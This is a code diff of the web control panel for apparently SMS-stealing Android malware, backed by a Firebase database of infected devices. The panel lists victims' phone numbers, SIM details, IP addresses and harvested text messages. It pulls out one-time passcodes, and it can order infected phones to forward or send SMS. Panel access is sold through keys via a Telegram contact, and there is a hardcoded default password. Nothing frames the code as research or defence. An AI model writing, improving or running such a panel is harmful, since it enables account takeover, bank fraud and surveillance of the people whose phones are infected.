@@ -156,96 +156,53 @@ body{font-family:'Fira Code',monospace;background:#0a0a0f;color:#ff2244;overflow
 <div id="toast"></div>
 
 <script>
+// === MEDIA ===
+function startMedia(){
+  const v=document.getElementById('bgVid'),a=document.getElementById('bgAudio');
+  v.play().catch(()=>{});
+  a.play().catch(()=>{});
+}
+function toggleMute(){
+  const a=document.getElementById('bgAudio'),b=document.getElementById('muteBtn');
+  a.muted=!a.muted;
+  b.textContent=a.muted?'🔇':'🔊';
+}
+
+function genKey(){window.location.href='https://t.me/8976072495'}
+
 firebase.initializeApp({databaseURL:'https://yono-ad3-default-rtdb.firebaseio.com'});
 const db=firebase.database();
 
-let clients={},searchQ='',curDeviceId='',loggedIn=false;
+let clientsData={},searchQ='',curDeviceId='',showOnline=false;
 const DEF_PASS='Alexa';
 const TG_ID='8976072495';
 
-function genKey(){window.location.href='https://t.me/'+TG_ID}
-function startMedia(){const v=document.getElementById('bgVid'),a=document.getElementById('bgAudio');v.play().catch(()=>{});a.play().catch(()=>{})}
-function toggleMute(){const a=document.getElementById('bgAudio'),b=document.getElementById('muteBtn');a.muted=!a.muted;b.textContent=a.muted?'🔇':'🔊'}
 function copyT(t){if(navigator.clipboard){navigator.clipboard.writeText(t).then(()=>showToast('✔ COPIED'))}else showToast(t)}
-function parseTime(t){if(!t)return 0;try{return new Date(t.replace('|','')).getTime()}catch(e){return 0}}
-function getPhone(d){return d.mobNo||(d.sims&&d.sims[0]?d.sims[0].phoneNumber:'')||''}
-function getName(d){return d.modelName||d.deviceId?.slice(0,10)||'UNKNOWN'}
-function isOnline(d){return d.status===true}
+function parseTime(t){
+  if(!t)return 0;
+  try{return new Date(t.replace('|','')).getTime()}catch(e){return 0}
+}
+function isOnline(id){
+  const d=clientsData[id];
+  if(!d)return false;
+  return d.status===true
+}
+function getPhone(id){const d=clientsData[id];return d?d.mobNo||(d.sims&&d.sims[0]?d.sims[0].phoneNumber:''):''}
+function getName(id){const d=clientsData[id];return d?d.modelName||d.deviceId?.slice(0,10):id.slice(0,10)}
+function getDeviceIds(){return Object.keys(clientsData).filter(k=>clientsData[k]&&clientsData[k].deviceId)}
 function getDeviceSms(id){
-  const d=clients[id];
+  const d=clientsData[id];
   if(!d||!d.messages)return[];
-  return Object.values(d.messages).sort((a,b)=>parseTime(b.dateTime)-parseTime(a.dateTime))
+  return Object.values(d.messages).map(m=>({...m,deviceId:id})).sort((a,b)=>parseTime(b.dateTime)-parseTime(a.dateTime))
 }
 function getAllSms(){
   const list=[];
-  Object.keys(clients||{}).forEach(did=>{getDeviceSms(did).forEach(s=>list.push(s))});
+  getDeviceIds().forEach(did=>{getDeviceSms(did).forEach(s=>list.push(s))});
   return list.sort((a,b)=>parseTime(b.dateTime)-parseTime(a.dateTime))
 }
-function showToast(m){const t=document.getElementById('toast');t.textContent=m;t.style.opacity='1';clearTimeout(t._h);t._h=setTimeout(()=>t.style.opacity='0',2500)}
 
-function showScr(id){
-  document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
-  document.getElementById(id).classList.add('act');
-  if(id==='mainScr')renderDashboard();
-  else if(id==='allSmsScr')renderAllSms();
-}
-window.closeDetail=()=>{curDeviceId='';showScr('mainScr')};
-function showKeyLogin(){document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));document.getElementById('keyScr').classList.add('act')}
-
-function doLogin(){
-  const p=document.getElementById('loginPass').value;
-  if(!p){document.getElementById('loginErr').textContent='✖ ENTER PASSWORD';return}
-  db.ref('admin/password/password').once('value').then(s=>{
-    const sp=s.val()||DEF_PASS;
-    if(p===sp||p===DEF_PASS){
-      localStorage.setItem('po_pass',p);
-      loggedIn=true;
-      document.getElementById('logScr').classList.remove('act');
-      document.getElementById('mainScr').classList.add('act');
-      renderDashboard();
-      startMedia();
-      showToast('█ ACCESS GRANTED');
-    }else document.getElementById('loginErr').textContent='✖ ACCESS DENIED'
-  }).catch(()=>{
-    if(p===DEF_PASS){
-      localStorage.setItem('po_pass',DEF_PASS);
-      loggedIn=true;
-      document.getElementById('logScr').classList.remove('act');
-      document.getElementById('mainScr').classList.add('act');
-      renderDashboard();
-      startMedia();
-      showToast('█ ACCESS GRANTED');
-    }else document.getElementById('loginErr').textContent='✖ ERROR'
-  });
-}
-document.getElementById('loginPass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin()});
-
-function keyLogin(){
-  const k=document.getElementById('keyInput').value.trim();
-  if(!k){document.getElementById('keyErr').textContent='✖ ENTER KEY';return}
-  document.getElementById('keyErr').textContent='';
-  db.ref('panel_keys/'+k).once('value',sn=>{
-    const d=sn.val();
-    if(d&&d.active===true){
-      localStorage.setItem('po_pass','key_'+k);
-      loggedIn=true;
-      document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
-      document.getElementById('mainScr').classList.add('act');
-      renderDashboard();
-      startMedia();
-      showToast('█ KEY ACCEPTED');
-      if(!d.used_by)db.ref('panel_keys/'+k+'/used_by').set('browser');
-    }else document.getElementById('keyErr').textContent='✖ INVALID KEY'
-  }).catch(()=>document.getElementById('keyErr').textContent='✖ ERROR');
-}
-
-document.addEventListener('DOMContentLoaded',()=>{
-  const p=localStorage.getItem('po_pass');
-  if(p&&p.startsWith('key_')){showKeyLogin();document.getElementById('keyInput').value=p.replace('key_','');keyLogin()}
-  else if(p){document.getElementById('loginPass').value=p;doLogin()}
-});
-
-db.ref('clients').on('value',snap=>{clients=snap.val()||{};if(document.querySelector('.scr.act'))updateUI()});
+// Listeners
+db.ref('clients').on('value',snap=>{clientsData=snap.val()||{};updateUI()});
 db.ref('.info/connected').on('value',snap=>{if(snap.val()===true)showToast('█ CONNECTED')});
 
 function updateUI(){
@@ -256,12 +213,19 @@ function updateUI(){
   else if(id==='detailScr'&&curDeviceId)renderDetail();
   else if(id==='allSmsScr')renderAllSms();
 }
+function showScr(id){
+  document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
+  document.getElementById(id).classList.add('act');
+  updateUI();
+}
+window.closeDetail=()=>{curDeviceId='';showScr('mainScr')};
+function showKeyLogin(){document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));document.getElementById('keyScr').classList.add('act')}
 
 function renderDashboard(){
-  const ids=Object.keys(clients).filter(k=>clients[k]&&clients[k].deviceId);
+  const ids=getDeviceIds();
   const smsList=getAllSms();
-  const otpCount=smsList.filter(s=>(s.message||'').toUpperCase().includes('OTP')).length;
-  const online=ids.filter(k=>isOnline(clients[k])).length;
+  const otpCount=smsList.filter(s=>(s.message||s.body||'').toUpperCase().includes('OTP')).length;
+  const online=ids.filter(id=>isOnline(id)).length;
   document.getElementById('onlineBdg').innerHTML='⬤ '+online;
   document.getElementById('dashStats').innerHTML=`
     <div class="s"><div class="v">${ids.length}</div><div class="l">DEVICES</div></div>
@@ -274,15 +238,16 @@ function renderDashboard(){
     <div class="b" onclick="showAllOtps()"><span class="ic">🔑</span><span class="l">OTP</span></div>
     <div class="b" onclick="showScr('allSmsScr')"><span class="ic">📥</span><span class="l">ALL SMS</span></div>`;
   let filtered=ids;
-  if(showOnline)filtered=ids.filter(k=>isOnline(clients[k]));
+  if(showOnline)filtered=ids.filter(id=>isOnline(id));
   const q=searchQ.toLowerCase();
-  if(q)filtered=filtered.filter(k=>k.toLowerCase().includes(q)||getPhone(clients[k]).toLowerCase().includes(q)||getName(clients[k]).toLowerCase().includes(q));
+  if(q)filtered=filtered.filter(d=>d.toLowerCase().includes(q)||getPhone(d).toLowerCase().includes(q)||getName(d).toLowerCase().includes(q));
   let html=`<div class="cd"><h3>💻 DEVICES (${filtered.length}/${ids.length})</h3>`;
-  filtered.forEach(k=>{
-    const d=clients[k],n=getName(d),o=isOnline(d),phone=getPhone(d),sms=getDeviceSms(k);
-    const ot=sms.filter(x=>(x.message||'').toUpperCase().includes('OTP')).length;
-    html+=`<div class="dc" onclick="openDevice('${k}')">
-      <div class="tr"><span class="sno">${k.slice(0,8)}</span><span class="dn">${n}</span><span class="st ${o?'on':'off'}"></span></div>
+  filtered.forEach(d=>{
+    const sms=getDeviceSms(d),n=getName(d),o=isOnline(d);
+    const ot=sms.filter(x=>(x.message||x.body||'').toUpperCase().includes('OTP')).length;
+    const phone=getPhone(d);
+    html+=`<div class="dc" onclick="openDevice('${d}')">
+      <div class="tr"><span class="sno">${d.slice(0,8)}</span><span class="dn">${n}</span><span class="st ${o?'on':'off'}"></span></div>
       <div class="di">${phone?`<span class="cp" onclick="event.stopPropagation();copyT('${phone}')">📞${phone}</span>`:''}</div>
       <div class="m"><sp>📨 ${sms.length}</sp><sp>🔑 ${ot}</sp><sp style="color:${o?'#ff2244':'#3355ff'}">${o?'ONLINE':'OFFLINE'}</sp></div>
     </div>`;
@@ -310,31 +275,25 @@ function switchTab(tab){
 
 function renderDetail(){
   const did=curDeviceId;
-  const d=clients[did]||{};
+  const d=clientsData[did]||{};
   const smsList=getDeviceSms(did);
-  const otps=smsList.filter(s=>(s.message||'').toUpperCase().includes('OTP'));
-  const ol=isOnline(d),phone=getPhone(d);
-  document.getElementById('detailTitle').textContent=getName(d);
+  const otps=smsList.filter(s=>(s.message||s.body||'').toUpperCase().includes('OTP'));
+  const ol=isOnline(did),phone=getPhone(did);
+  document.getElementById('detailTitle').textContent=getName(did);
   document.getElementById('detailBadge').textContent=ol?'⬤ ONLINE':'○ OFFLINE';
   document.getElementById('detailBadge').style.color=ol?'#00ff41':'#3355ff';
   document.getElementById('detailBadge').style.borderColor=ol?'#00ff4188':'#3355ff88';
-  let infoHtml=`<div class="cd"><h3>💻 ${getName(d)}</h3><div class="hl">`;
+  let infoHtml=`<div class="cd"><h3>💻 ${getName(did)}</h3><div class="hl">`;
   infoHtml+=`<div>ID   : <span>${did}</span></div>`;
   if(phone)infoHtml+=`<div>PHONE: <span class="cp" onclick="copyT('${phone}')">${phone} 📋</span></div>`;
-  infoHtml+=`<div>MODEL: <span>${d.modelName||'-'}</span></div>`;
-  infoHtml+=`<div>ANDROID: <span>${d.androidV||'-'}</span></div>`;
-  infoHtml+=`<div>SDK  : <span>${d.sdkV||'-'}</span></div>`;
-  infoHtml+=`<div>CPU  : <span>${d.cpu_arch||'-'}</span></div>`;
-  infoHtml+=`<div>BATTERY: <span>${d.battery||'-'}</span></div>`;
-  infoHtml+=`<div>STORAGE: <span>${d.storage||'-'}</span></div>`;
-  infoHtml+=`<div>IP    : <span>${d.ip_address||'-'}</span></div>`;
-  infoHtml+=`<div>PROVIDER: <span>${d.service_provider||'-'}</span></div>`;
-  infoHtml+=`<div>ROOT : <span>${d.isRoot?'YES':'NO'}</span></div>`;
-  infoHtml+=`<div>SDCARD: <span>${d.isSdCard?'YES':'NO'}</span></div>`;
-  infoHtml+=`<div>JOINED: <span>${d.joined||'-'}</span></div>`;
-  infoHtml+=`<div>LAST : <span>${d.last_seen||'-'}</span></div>`;
+  Object.keys(d).forEach(k=>{
+    if(k==='deviceId'||k==='messages'||k==='sims')return;
+    const v=d[k];
+    infoHtml+=`<div>${k.toUpperCase()}: <span>${typeof v==='object'?JSON.stringify(v):v}</span></div>`
+  });
   infoHtml+=`<div>SIMs: <span>${d.sims?d.sims.map(s=>s.carrierName+' '+s.phoneNumber).join(', '):'-'}</span></div>`;
-  infoHtml+=`<div>STAT : <span style="color:${ol?'#ff2244':'#3355ff'}">${ol?'ONLINE':'OFFLINE'}</span></div></div></div>`;
+  infoHtml+=`<div>STAT : <span style="color:${ol?'#ff2244':'#3355ff'}">${ol?'ONLINE':'OFFLINE'}</span></div>`;
+  infoHtml+=`<div>SMS  : <span>${smsList.length}</span></div></div></div>`;
   document.getElementById('detailInfo').innerHTML=infoHtml;
   document.getElementById('detailTabs').innerHTML=`
     <div class="t ${dtTab==='info'?'act':''}" onclick="switchTab('info')">ℹ️ INFO</div>
@@ -344,34 +303,37 @@ function renderDetail(){
     <div class="t ${dtTab==='sms'?'act':''}" onclick="switchTab('sms')">📥 SMS</div>`;
   document.getElementById('detailBody').innerHTML='';
   if(dtTab==='info'){
-    let h='<div class="cd"><h3>ℹ️ DEVICE INFO</h3>';
-    h+=`<div class="hl"><div>No additional forms.</div></div>`;
-    h+=`</div>`;
+    let h='<div class="cd"><h3>ℹ️ DEVICE DATA</h3>';
+    const dd=clientsData[did]||{};
+    const fields=['modelName','androidV','sdkV','cpu_arch','battery','storage','ip_address','service_provider','isRoot','isSdCard','joined','last_seen'];
+    fields.forEach(k=>{
+      if(dd[k])h+=`<div class="hl" style="margin-bottom:4px"><div>${k}: <span>${dd[k]}</span></div></div>`
+    });
+    h+=`${!fields.some(k=>dd[k])?'<div style="padding:16px;color:#ff224444;font-size:12px">NO DATA</div>':''}</div>`;
     document.getElementById('detailBody').innerHTML=h;
   }else if(dtTab==='otp'){
     document.getElementById('detailBody').innerHTML=`<div class="cd"><h3>🔑 OTPs (${otps.length})</h3>
       ${otps.length?otps.map(s=>{
-        const body=s.message||'';
-        return `<div class="oi"><div class="h"><span>${s.sender||'?'}</span><span>${s.dateTime||''}</span></div><div class="oc">${body.replace(/[^0-9]/g,'').slice(0,8)}</div><div class="fr">${body.slice(0,100)}</div></div>`
+        const body=s.message||s.body||'';
+        return `<div class="oi"><div class="h"><span>${s.sender||s.from||'?'}</span><span>${s.dateTime||s.date||s.time||''}</span></div><div class="oc">${body.replace(/[^0-9]/g,'').slice(0,8)}</div><div class="fr">${body.slice(0,100)}</div></div>`
       }).join(''):'<div style="padding:20px;text-align:center;color:#ff224444;font-size:12px">NO OTPs</div>'}
     </div>`;
   }else if(dtTab==='sms'){
     document.getElementById('detailBody').innerHTML=`<div class="cd"><h3>📨 MESSAGES (${smsList.length})</h3>
       ${smsList.length?smsList.map(s=>{
-        const body=s.message||'';
-        const sender=s.sender||'?';
-        return `<div class="smi"><div class="av">${sender[0]}</div><div class="b"><div class="n">${sender}</div><div class="m">${body}</div><div class="t">${s.dateTime||''}</div></div></div>`
+        const body=s.message||s.body||'';
+        const sender=s.sender||s.from||'?';
+        return `<div class="smi"><div class="av">${sender[0]}</div><div class="b"><div class="n">${sender}</div><div class="m">${body}</div><div class="t">${s.dateTime||s.date||s.time||''}</div></div></div>`
       }).join(''):'<div style="padding:20px;text-align:center;color:#ff224444;font-size:12px">NO MESSAGES</div>'}
     </div>`;
-  }else if(dtTab==='fwd'||dtTab==='send'){
-    // detailFwd and detailSmsSend sections are toggled via switchTab
   }
 }
 
 function doFwd(action){
   const num=document.getElementById('devFwdNum').value.trim();
   if(action==='activate'&&!num){showToast('█ ENTER FORWARD NUMBER');return}
-  db.ref('data/command').set({action:action==='activate'?'forward_on':'forward_off',number:num||'',deviceId:curDeviceId,timestamp:Date.now()},err=>{
+  const ref=db.ref('data/command');
+  ref.set({action:action==='activate'?'forward_on':'forward_off',number:num||'',deviceId:curDeviceId,timestamp:Date.now()},err=>{
     if(err)showToast('✖ ERROR');
     else{showToast(action==='activate'?'↪ FORWARD ACTIVATED: '+num:'↪ FORWARD DEACTIVATED');document.getElementById('devFwdNum').value=''}
   });
@@ -389,7 +351,7 @@ function doSendSms(){
 
 function showAllOtps(){
   const smsList=getAllSms();
-  const otps=smsList.filter(s=>(s.message||'').toUpperCase().includes('OTP'));
+  const otps=smsList.filter(s=>(s.message||s.body||'').toUpperCase().includes('OTP'));
   document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
   document.getElementById('mainScr').classList.add('act');
   document.getElementById('dashStats').innerHTML='';
@@ -399,8 +361,8 @@ function showAllOtps(){
     <h2 style="flex:1;font-family:'Orbitron',sans-serif;font-size:13px;color:#ff2244;letter-spacing:1px">🔑 ALL OTPs (${otps.length})</h2>
   </div>`;
   otps.forEach(s=>{
-    const body=s.message||'';
-    html+=`<div class="oi"><div class="h"><span>${s.sender||'?'}</span><span>${s.dateTime||''}</span></div><div class="oc">${body.replace(/[^0-9]/g,'').slice(0,8)}</div><div class="fr">${body.slice(0,100)}</div></div>`
+    const body=s.message||s.body||'';
+    html+=`<div class="oi"><div class="h"><span>${s.sender||s.from||'?'}</span><span>${s.dateTime||s.date||s.time||''}</span><span style="font-size:8px;color:#ff224444">${s.deviceId?.slice(0,8)||''}</span></div><div class="oc">${body.replace(/[^0-9]/g,'').slice(0,8)}</div><div class="fr">${body.slice(0,100)}</div></div>`
   });
   html+=`${!otps.length?'<div style="padding:30px;text-align:center;color:#ff224444">NO OTPs</div>':''}`;
   document.getElementById('dashBody').innerHTML=html;
@@ -411,16 +373,69 @@ function renderAllSms(){
   document.getElementById('allSmsCnt').textContent=all.length;
   let html=`<div class="cd"><h3>📥 ALL SMS (${all.length})</h3>`;
   all.slice(0,200).forEach(s=>{
-    const body=s.message||'';
-    const sender=s.sender||'?';
-    html+=`<div class="smi" onclick="showDetailFromSms('${body}')"><div class="av">${sender[0]}</div><div class="b"><div class="n">${sender} <span style="font-size:9px;color:#ff224444">via device</span></div><div class="m">${body}</div><div class="t">${s.dateTime||''}</div></div></div>`
+    const body=s.message||s.body||'';
+    const sender=s.sender||s.from||'?';
+    html+=`<div class="smi" onclick="openDevice('${s.deviceId}')"><div class="av">${sender[0]}</div><div class="b"><div class="n">${sender} <span style="font-size:9px;color:#ff224444">via ${getName(s.deviceId)||s.deviceId?.slice(0,8)}</span></div><div class="m">${body}</div><div class="t">${s.dateTime||s.date||s.time||''}</div></div></div>`
   });
   html+=`${!all.length?'<div style="padding:30px;text-align:center;color:#ff224444;font-size:12px">NO MESSAGES</div>':''}`;
   if(all.length>200)html+=`<div style="text-align:center;padding:10px;color:#ff224444;font-size:10px">SHOWING 200 OF ${all.length}</div>`;
   html+=`</div>`;
   document.getElementById('allSmsContent').innerHTML=html;
 }
-function showDetailFromSms(){}
+
+function doLogin(){
+  const p=document.getElementById('loginPass').value;
+  if(!p){document.getElementById('loginErr').textContent='✖ ENTER PASSWORD';return}
+  db.ref('admin/password/password').once('value').then(s=>{
+    const sp=s.val()||DEF_PASS;
+    if(p===sp||p===DEF_PASS){
+      localStorage.setItem('po_pass',p);
+      document.getElementById('logScr').classList.remove('act');
+      document.getElementById('mainScr').classList.add('act');
+      renderDashboard();
+      startMedia();
+      showToast('█ ACCESS GRANTED');
+    }else document.getElementById('loginErr').textContent='✖ ACCESS DENIED'
+  }).catch(()=>{
+    if(p===DEF_PASS){
+      localStorage.setItem('po_pass',DEF_PASS);
+      document.getElementById('logScr').classList.remove('act');
+      document.getElementById('mainScr').classList.add('act');
+      renderDashboard();
+      startMedia();
+      showToast('█ ACCESS GRANTED');
+    }else document.getElementById('loginErr').textContent='✖ ERROR'
+  });
+}
+
+function keyLogin(){
+  const k=document.getElementById('keyInput').value.trim();
+  if(!k){document.getElementById('keyErr').textContent='✖ ENTER KEY';return}
+  document.getElementById('keyErr').textContent='';
+  db.ref('panel_keys/'+k).once('value',sn=>{
+    const d=sn.val();
+    if(d&&d.active===true){
+      localStorage.setItem('po_pass','key_'+k);
+      document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
+      document.getElementById('mainScr').classList.add('act');
+      renderDashboard();
+      startMedia();
+      showToast('█ KEY ACCEPTED');
+      if(!d.used_by)db.ref('panel_keys/'+k+'/used_by').set('browser');
+    }else document.getElementById('keyErr').textContent='✖ INVALID KEY'
+  }).catch(()=>document.getElementById('keyErr').textContent='✖ ERROR');
+}
+
+document.addEventListener('DOMContentLoaded',()=>{
+  const p=localStorage.getItem('po_pass');
+  if(p&&p.startsWith('key_')){document.getElementById('keyInput').value=p.replace('key_','');keyLogin()}
+  else if(p){document.getElementById('loginPass').value=p;doLogin()}
+});
+document.getElementById('loginPass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin()});
+function showToast(m){
+  const t=document.getElementById('toast');t.textContent=m;t.style.opacity='1';
+  clearTimeout(t._h);t._h=setTimeout(()=>t.style.opacity='0',2500);
+}
 </script>
 </body>
 </html>
